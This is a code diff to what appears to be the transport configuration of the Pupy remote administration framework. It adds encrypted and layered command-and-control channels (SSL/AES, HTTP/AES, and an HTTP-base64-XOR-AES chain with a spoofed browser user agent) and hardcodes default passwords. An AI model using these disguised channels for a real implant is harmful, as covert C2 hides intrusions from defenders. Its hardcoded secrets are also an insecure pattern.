@@ -74,6 +74,18 @@ transports["ssl_proxy"]={
         "client_transport_kwargs": {},
         "server_transport_kwargs": {},
     }
+transports["ssl_aes"]={
+        "info" : "TCP transport wrapped with SSL and AES",
+        "server" : PupyTCPServer,
+        "client": PupySSLClient,
+        "client_kwargs" : {},
+        "authenticator" : ssl_authenticator,
+        "stream": PupySocketStream ,
+        "client_transport" : AES256.set(iterations=10000),
+        "server_transport" : AES256.set(iterations=10000),
+        "client_transport_kwargs": {"password" : "Pupy_d3f4uld_p4sS"},
+        "server_transport_kwargs": {"password" : "Pupy_d3f4uld_p4sS"},
+    }
 transports["tcp_cleartext"]={
         "info" : "Simple TCP transport transmitting in cleartext",
         "server" : PupyTCPServer,
@@ -111,7 +123,7 @@ transports["tcp_base64"]={
         "server_transport_kwargs": {},
     }
 
-transports["sync_http_cleartext"]={ #TODO fill with empty requests/response between each request/response to have only a following of req/res and not unusual things like req/req/req/res/res/req ...
+transports["http_cleartext"]={ #TODO fill with empty requests/response between each request/response to have only a following of req/res and not unusual things like req/req/req/res/res/req ...
         "info" : "TCP transport using HTTP with base64 encoded payloads (synchrone with Keep-Alive headers and one 3-way-handshake)",
         "server" : PupyTCPServer,
         "client": PupyTCPClient,
@@ -120,6 +132,24 @@ transports["sync_http_cleartext"]={ #TODO fill with empty requests/response betw
         "stream": PupySocketStream ,
         "client_transport" : PupyHTTPClient,
         "server_transport" : PupyHTTPServer,
+        "client_transport_kwargs": {},
+        "server_transport_kwargs": {},
+    }
+transports["http_aes"]={
+        "info" : "TCP transport using HTTP+AES",
+        "server" : PupyTCPServer,
+        "client": PupyTCPClient,
+        "client_kwargs" : {},
+        "authenticator" : None,
+        "stream": PupySocketStream ,
+        "client_transport" : chain_transports(
+                PupyHTTPClient.custom(keep_alive=True),
+                AES256.custom(password=scramblesuit_passwd, iterations=10000)
+            ),
+        "server_transport" : chain_transports(
+                PupyHTTPServer,
+                AES256.set(password=scramblesuit_passwd, iterations=10000)
+            ),
         "client_transport_kwargs": {},
         "server_transport_kwargs": {},
     }
@@ -135,7 +165,9 @@ transports["tcp_aes"]={
         "client_transport_kwargs": {"password": "pupy_t3st_p4s5word"},
         "server_transport_kwargs": {"password": "pupy_t3st_p4s5word"},
     }
-transports["test_stacking"]={
+
+
+transports["trololo"]={
         "info" : "test wrapping",
         "server" : PupyTCPServer,
         "client": PupyTCPClient,
@@ -143,22 +175,27 @@ transports["test_stacking"]={
         "authenticator" : None,
         "stream": PupySocketStream ,
         "client_transport" : chain_transports(
-                PupyHTTPClient, 
-                AES256.set(password="toto123", iterations=10000),
-                XOR.set(xorkey="trololo"), 
-                AES128.set(password="plop123", iterations=10000),
-                B64Client,
+                PupyHTTPClient.custom(method="POST", user_agent="Mozilla 5.0", keep_alive=True),
+                B64Transport,
+                PupyHTTPClient.custom(method="GET", user_agent="Mozilla-ception", keep_alive=True),
+                XOR.set(xorkey="trololo"),
+                AES256.custom(password="plop2", iterations=10000),
+                AES128.custom(password="plop1", iterations=10000),
             ),
         "server_transport" : chain_transports(
+                PupyHTTPServer.custom(response_code="418 I'm a teapot"),
+                B64Transport,
                 PupyHTTPServer,
-                AES256.set(password="toto123", iterations=10000),
                 XOR.set(xorkey="trololo"),
-                AES128.set(password="plop123", iterations=10000),
-                B64Server,
+                AES256.set(password="plop2", iterations=10000),
+                AES128.set(password="plop1", iterations=10000),
             ),
         "client_transport_kwargs": {},
         "server_transport_kwargs": {},
     }
+
+
+
 
 transports["async_http_cleartext"]={
         "info" : "TCP transport using HTTP with base64 encoded payloads (asynchrone with client pulling the server and multiple 3-way handshakes (slow))",
@@ -167,7 +204,7 @@ transports["async_http_cleartext"]={
         "client_kwargs" : {},
         "authenticator" : None,
         "stream": PupyAsyncTCPStream ,
-        "client_transport" : PupyHTTPClient,
+        "client_transport" : PupyHTTPClient.set(keep_alive=False),
         "server_transport" : PupyHTTPServer,
         "client_transport_kwargs": {},
         "server_transport_kwargs": {},
